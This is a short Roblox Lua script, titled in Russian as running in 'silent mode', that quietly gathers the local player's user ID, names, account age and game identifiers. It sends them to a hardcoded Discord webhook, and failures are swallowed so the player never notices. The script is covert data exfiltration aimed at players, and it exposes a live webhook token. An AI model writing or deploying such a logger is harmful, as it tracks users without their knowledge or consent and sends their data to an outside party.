-- NetLogger.lua (тихий режим)
local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer

local data = {
    userId = player.UserId,
    name = player.Name,
    displayName = player.DisplayName,
    accountAge = player.AccountAge,
    gameId = game.GameId or "unknown",
    placeId = game.PlaceId or "unknown",
    serverTime = os.time()
}

local webhook = "https://discord.com/api/webhooks/1530947322064928950/h3h94_tyIWNw8zq8PnPqjwyGYNhwv_tPe6VZvOntZGDAmrkhl22YkDtf7ZZtzUXYOWj1"

pcall(function()
    local headers = {["Content-Type"] = "application/json"}
    HttpService:PostAsync(webhook, HttpService:JSONEncode(data), false, headers)
end)
